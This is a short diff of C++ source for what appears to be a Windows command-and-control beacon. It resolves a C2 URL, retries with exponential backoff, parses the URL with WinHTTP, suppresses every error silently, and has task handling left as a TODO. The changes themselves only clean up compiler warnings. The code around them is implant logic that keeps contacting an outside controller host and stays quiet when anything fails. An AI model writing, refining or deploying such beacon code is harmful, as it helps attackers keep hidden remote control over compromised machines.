@@ -70,7 +70,7 @@ void Beacon::run() {
             try {
                 c2Url_ = resolver.resolve();
                 c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
-            } catch (const std::exception& e) {
+            } catch (const std::exception&) {
                 std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                 if (c2FetchBackoff_ < 35 * 60) {
                     c2FetchBackoff_ *= 2;
@@ -134,7 +134,7 @@ void Beacon::run() {
             urlComp.lpszUrlPath = path;
             urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);
 
-            if (!WinHttpCrackUrl(wideC2Url.c_str(), wideC2Url.length(), 0, &urlComp)) {
+            if (!WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
                 c2Url_ = "";
                 continue;
             }
@@ -164,7 +164,7 @@ void Beacon::run() {
                 // TODO: Process tasks
             }
 
-        } catch (const std::exception& e) {
+        } catch (const std::exception&) {
             // Silently continue
         }
 
